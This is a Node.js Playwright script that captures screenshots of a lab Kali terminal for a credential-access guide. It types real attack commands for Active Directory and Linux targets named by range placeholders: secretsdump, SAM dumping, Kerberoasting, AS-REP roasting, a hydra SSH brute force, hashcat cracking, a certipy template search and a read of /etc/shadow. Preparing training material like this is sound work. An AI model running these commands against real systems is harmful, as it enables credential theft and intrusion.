/**
 * capture-02-credential-access.js
 * Automates screenshots for the Credential Access guide.
 * Manual-only tools (responder, coercer+relay) are skipped — capture those manually.
 * Credentials loaded from secrets/range.env
 */

const { chromium } = require('playwright');
const path = require('path');
const fs   = require('fs');

const ENV_FILE = path.join(__dirname, '..', 'secrets', 'range.env');
if (!fs.existsSync(ENV_FILE)) { console.error('Missing secrets/range.env'); process.exit(1); }
const VARS = Object.fromEntries(
  fs.readFileSync(ENV_FILE, 'utf8').split('\n')
    .filter(l => l.includes('=') && !l.startsWith('#'))
    .map(l => { const [k, ...v] = l.split('='); return [k.trim(), v.join('=').trim()]; })
);

const KALI_TERMINAL = `http://${VARS.KALI_IP}:7681`;
const SHOTS_DIR     = path.join(__dirname, '..', 'guides', 'screenshots', '02-credential-access');

function sub(cmd) { return cmd.replace(/<(\w+)>/g, (_, k) => VARS[k] ?? `<${k}>`); }

async function typeCmd(page, cmd) {
  await page.click('.xterm-helper-textarea, canvas, textarea').catch(() => {});
  await page.waitForTimeout(300);
  await page.keyboard.type(sub(cmd), { delay: 25 });
  await page.keyboard.press('Enter');
}

async function wait(page, ms) { await page.waitForTimeout(ms); }

async function shot(page, filename) {
  await page.waitForTimeout(800);
  const p = path.join(SHOTS_DIR, filename);
  await page.screenshot({ path: p });
  console.log(`  📸 ${filename}`);
}

async function clear(page) {
  await typeCmd(page, 'clear');
  await page.waitForTimeout(600);
}

async function run() {
  fs.mkdirSync(SHOTS_DIR, { recursive: true });
  const browser = await chromium.launch({ headless: true });
  const page    = await (await browser.newContext()).newPage();
  await page.setViewportSize({ width: 1400, height: 820 });
  await page.goto(KALI_TERMINAL, { waitUntil: 'networkidle', timeout: 15000 });
  await wait(page, 2000);

  // ── 01: secretsdump ──────────────────────────────────────────────────────
  console.log('\n[1] impacket-secretsdump...');
  await clear(page);
  await typeCmd(page, 'impacket-secretsdump <DOMAIN>/<USERNAME>:\'<PASSWORD>\'@<DC_IP> 2>&1 | head -40');
  await wait(page, 90000);
  await shot(page, '01-secretsdump.png');

  // ── 02: netexec --lsa --sam ───────────────────────────────────────────────
  console.log('\n[2] netexec --sam...');
  await clear(page);
  await typeCmd(page, 'netexec smb <WIN_CLIENT_IP> -u <USERNAME> -p \'<PASSWORD>\' --sam');
  await wait(page, 30000);
  await shot(page, '02-netexec-lsa-sam.png');

  // ── 03: Kerberoasting ─────────────────────────────────────────────────────
  console.log('\n[3] Kerberoasting...');
  await clear(page);
  await typeCmd(page, 'impacket-GetUserSPNs <DOMAIN>/<USERNAME>:\'<PASSWORD>\' -dc-ip <DC_IP> -request 2>&1');
  await wait(page, 30000);
  await shot(page, '03-kerberoast.png');

  // ── 04: AS-REP Roasting ───────────────────────────────────────────────────
  console.log('\n[4] AS-REP Roasting...');
  await clear(page);
  await typeCmd(page, 'impacket-GetNPUsers <DOMAIN>/<USERNAME>:\'<PASSWORD>\' -dc-ip <DC_IP> -request -format hashcat 2>&1');
  await wait(page, 30000);
  await shot(page, '04-asrep-roast.png');

  // ── 05: hydra SSH ─────────────────────────────────────────────────────────
  console.log('\n[5] hydra SSH brute force...');
  await clear(page);
  await typeCmd(page, 'hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ssh://<LINUX_IP> -t 4 -V 2>&1 | head -30');
  await wait(page, 60000);
  await shot(page, '05-hydra-ssh.png');

  // ── 06: hashcat (demo with known hash) ───────────────────────────────────
  console.log('\n[6] hashcat demo...');
  await clear(page);
  await typeCmd(page, 'echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/demo.hash && hashcat -m 0 /tmp/demo.hash /usr/share/wordlists/rockyou.txt --force 2>&1 | tail -20');
  await wait(page, 30000);
  await shot(page, '06-hashcat-crack.png');

  // ── 09: certipy find ─────────────────────────────────────────────────────
  console.log('\n[9] certipy find...');
  await clear(page);
  await typeCmd(page, 'certipy find -u <USERNAME>@<DOMAIN> -p \'<PASSWORD>\' -dc-ip <DC_IP> -vulnerable -stdout 2>&1 | head -50');
  await wait(page, 60000);
  await shot(page, '09-certipy-find.png');

  // ── 10: Linux cred files ──────────────────────────────────────────────────
  console.log('\n[10] Linux credential harvesting...');
  await clear(page);
  await typeCmd(page, 'cat /etc/passwd | head -10 && echo "---" && sudo cat /etc/shadow 2>/dev/null | head -5 || echo "(shadow requires root)"');
  await wait(page, 10000);
  await shot(page, '10-linux-creds.png');

  await browser.close();
  console.log('\n✅ Credential access screenshots done.');
  console.log('⚠️  Tools 7 (responder) and 8 (coercer+relay) require manual capture — see guide for tmux instructions.');
}

run().catch(err => { console.error(err); process.exit(1); });
